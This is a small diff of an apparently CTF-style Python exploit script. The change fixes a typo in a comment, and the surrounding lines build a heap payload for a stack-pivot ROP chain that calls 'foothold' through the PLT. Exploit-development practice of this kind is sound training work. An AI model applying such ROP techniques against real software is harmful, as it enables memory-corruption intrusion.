@@ -313,7 +313,7 @@ heap_address = int(heap_address, 16)
 info('READ HEAP ADDRESS: %s' % hex(heap_address))
 
 # First we can write up to 256 (0x100) bytes onto the heap.
-# Our pop_rsp gadget (used further down) first make the stack point to here,
+# Our pop_rsp gadget (used further down) first makes the stack point to here,
 # then it will pop the three registers r13, r14, and r15.
 heap_payload  = p64(0x13) + p64(0x14) + p64(0x15)
 heap_payload += p64(foothold_plt)                                # call foothold to resolve its address
